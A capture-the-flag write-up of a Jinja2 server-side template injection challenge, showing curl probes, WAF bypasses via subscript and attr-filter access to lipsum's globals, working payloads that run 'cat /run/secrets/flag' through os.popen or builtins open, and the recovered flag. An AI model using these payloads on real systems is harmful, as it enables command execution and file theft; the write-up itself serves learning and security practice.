## 1. Challenge Overview

The challenge page presents a simple form:

```html
<form>
  <input name=greeting placeholder='Your greeting'>
  <button>Weave</button>
</form>
```

The hint text reads:

> Jinja-powered invitations. Staff dispatch: /run/secrets/flag

This immediately suggests a **Server-Side Template Injection (SSTI)** vulnerability in a Jinja2 template, with the goal of reading `/run/secrets/flag`.

---

## 2. Initial Recon

Fetch the main page and inspect the headers:

```bash
curl -i -s 'https://challenges.tibeb.org/677a519f-3ad9-4a66-8c61-84511103cf44/'
```

Relevant response headers:

```
content-security-policy: sandbox allow-forms; default-src 'none'; ...
server: cloudflare
```

The form uses `GET` with parameter `greeting`. No other endpoints were found (`robots.txt`, `sitemap.xml`, `.git/HEAD` all 404).

---

## 3. Confirming Jinja2 SSTI

Test basic arithmetic:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{7*7}}'
```

Response contains `<pre>49</pre>` → template injection confirmed.

Test Jinja-specific string multiplication:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{7*"7"}}'
```

Response contains `<pre>7777777</pre>` → **Jinja2** SSTI.

---

## 4. The Filter and the Tricky Bypass

### 4.1 A direct attribute payload is rejected

Attempt to dump the Flask config:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{config}}'
```

Response: `<pre></pre>` (empty). Likely filtered or not exposed.

Attempt to access `__globals__` via a normal attribute:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{url_for.__globals__}}'
```

Response: `Request could not be processed.`  
This records a rejected payload. The response alone does not establish the exact filtering rule.

### 4.2 Bypass using subscript notation

Use dictionary-style subscript instead of attribute access:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{lipsum["__globals__"]}}'
```

This **works** and dumps the entire `jinja2.utils` globals dictionary. The `lipsum` global is a Jinja2 utility function. In this environment its globals expose `os` and a builtins mapping containing `open`.

### 4.3 Another working bypass: `attr` filter

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{lipsum|attr("__globals__")}}'
```

This also returned the globals dictionary in the recorded test. These observations compare accepted and rejected access forms without proving a universal blacklist rule.

### 4.4 Why one payload failed

This payload returned `Request could not be processed.`:

```jinja
{{lipsum|attr("__globals__")|attr("__getitem__")("os").popen("cat /run/secrets/flag").read()}}
```

The exact reason for this rejection was not established. The simpler subscript form provided a recorded working alternative.

---

## 5. Exploitation — Reading the Flag

Using the subscript bypass, we can reach the `os` module and execute commands:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{lipsum["__globals__"]["os"].popen("cat /run/secrets/flag").read()}}'
```

Response:

```html
<pre>tibeb{loom_ce82addc3d9a84b6a9dd}</pre>
```

Alternative payload using built-in `open`:

```bash
curl -sG "$BASE" --data-urlencode 'greeting={{lipsum["__globals__"]["__builtins__"]["open"]("/run/secrets/flag").read()}}'
```

Same flag obtained.

---

## 6. Flag

```
tibeb{loom_ce82addc3d9a84b6a9dd}
```

---

## 7. Tricky Parts & Lessons Learned

1. **Filter bypass is key**  
   One direct-access payload was rejected while the shown subscript payload succeeded. Test the actual access forms rather than inferring a complete filtering policy from one response.

2. **`lipsum` is a powerful Jinja2 global**  
   `lipsum` (and similar globals like `cycler`, `joiner`, `namespace`) are available by default in Jinja2. Their `__globals__` often leak the `os` module and builtins, making them excellent SSTI pivots.

3. **Multiple bypass techniques**  
   - Subscript: `lipsum["__globals__"]`
   - `attr` filter: `lipsum|attr("__globals__")`
   - Avoid chaining multiple `attr` filters or using `__getitem__` if the WAF blocks those patterns.

4. **Read the hints**  
   The challenge description explicitly mentioned “Jinja-powered” and `/run/secrets/flag`, pointing directly to SSTI and the target file.

5. **CSP does not stop SSTI**  
   The strict Content-Security-Policy only affects client-side execution; server-side template injection remains fully exploitable.

6. **Observed response headers are not an application fix**  
   The supplied notes show a successful SSTI response despite those headers. The underlying fix is to keep untrusted input out of template source and restrict the exposed context.

---

## 8. Conclusion

This challenge demonstrates Jinja2 SSTI and a successful subscript-based access path. The recorded payloads reach the utility function’s globals and read the challenge flag. The observed filtering behavior is specific to this environment.

**Flag:** `tibeb{loom_ce82addc3d9a84b6a9dd}`
